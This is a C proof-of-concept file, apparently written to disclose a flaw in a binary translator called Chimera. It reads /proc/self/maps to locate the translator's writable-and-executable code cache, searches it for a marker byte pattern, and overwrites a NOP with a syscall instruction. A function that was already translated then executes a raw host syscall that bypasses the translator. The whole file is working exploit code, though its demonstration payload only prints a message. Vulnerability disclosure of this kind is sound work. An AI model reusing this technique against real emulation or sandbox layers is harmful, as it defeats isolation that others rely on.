// Demonstrates that a guest can patch Chimera's RWX translated-code cache.
//
// Expected native behavior: prints nothing and exits nonzero because there is
// no large RWX Chimera code-cache mapping to patch.
//
// Expected under vulnerable Chimera: prints RAW_SYSCALL_BYPASS from a raw
// host syscall that was written into already-translated code.

#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static const char raw_msg[] = "HOW DID YOU WRITE THIS????\n";

__attribute__((noinline, noclone))
static void victim(void) {
    asm volatile(
        "mov $1, %%eax\n\t"              // SYS_write on x86-64
        "mov $1, %%edi\n\t"              // stdout
        "lea raw_msg(%%rip), %%rsi\n\t"
        "mov %[len], %%edx\n\t"
        ".byte 0x66, 0x90\n\t"           // NOP. will be patched to syscall lol
        "movabs $0x1122334455667788, %%r11\n\t"
        :
        : [len] "i"(sizeof(raw_msg) - 1)
        : "rax", "rdi", "rsi", "rdx", "rcx", "r11", "memory");
}

static unsigned char *read_file(const char *path, size_t *out_len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        return NULL;
    }

    size_t cap = 16384;
    size_t len = 0;
    unsigned char *buf = malloc(cap + 1);
    if (!buf) {
        close(fd);
        return NULL;
    }

    for (;;) {
        if (len == cap) {
            cap *= 2;
            unsigned char *next = realloc(buf, cap + 1);
            if (!next) {
                free(buf);
                close(fd);
                return NULL;
            }
            buf = next;
        }
        ssize_t n = read(fd, buf + len, cap - len);
        if (n < 0) {
            free(buf);
            close(fd);
            return NULL;
        }
        if (n == 0) {
            break;
        }
        len += (size_t)n;
    }

    close(fd);
    buf[len] = 0;
    *out_len = len;
    return buf;
}

static int patch_rwx_mapping(uintptr_t lo, uintptr_t hi) {
    static const unsigned char marker[] = {
        0x49, 0xbb, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11
    };

    int patched = 0;
    for (uintptr_t p = lo + 2; p + sizeof(marker) <= hi; p++) {
        unsigned char *q = (unsigned char *)p;
        if (memcmp(q, marker, sizeof(marker)) != 0) {
            continue;
        }
        if (q[-2] != 0x66 || q[-1] != 0x90) {
            continue;
        }
        q[-2] = 0x0f;
        q[-1] = 0x05;
        patched++;
    }
    return patched;
}

static int patch_chimera_cache(void) {
    size_t maps_len = 0;
    unsigned char *maps = read_file("/proc/self/maps", &maps_len);
    if (!maps) {
        return 0;
    }

    int patched = 0;
    char *save = NULL;
    for (char *line = strtok_r((char *)maps, "\n", &save);
         line;
         line = strtok_r(NULL, "\n", &save)) {
        uintptr_t lo = 0;
        uintptr_t hi = 0;
        char perms[5] = {0};

        if (sscanf(line, "%lx-%lx %4s", &lo, &hi, perms) != 3) {
            continue;
        }
        if (strcmp(perms, "rwxp") != 0) {
            continue;
        }

        patched += patch_rwx_mapping(lo, hi);
    }

    free(maps);
    return patched;
}

int main(void) {
    victim(); // force translation of victim while it still contains NOPs

    write(1, "write_test\n", 11);

    if (patch_chimera_cache() <= 0) {
        return 1;
    }

    victim(); // now executes a raw host syscall from the patched code cache
    return 0;
}
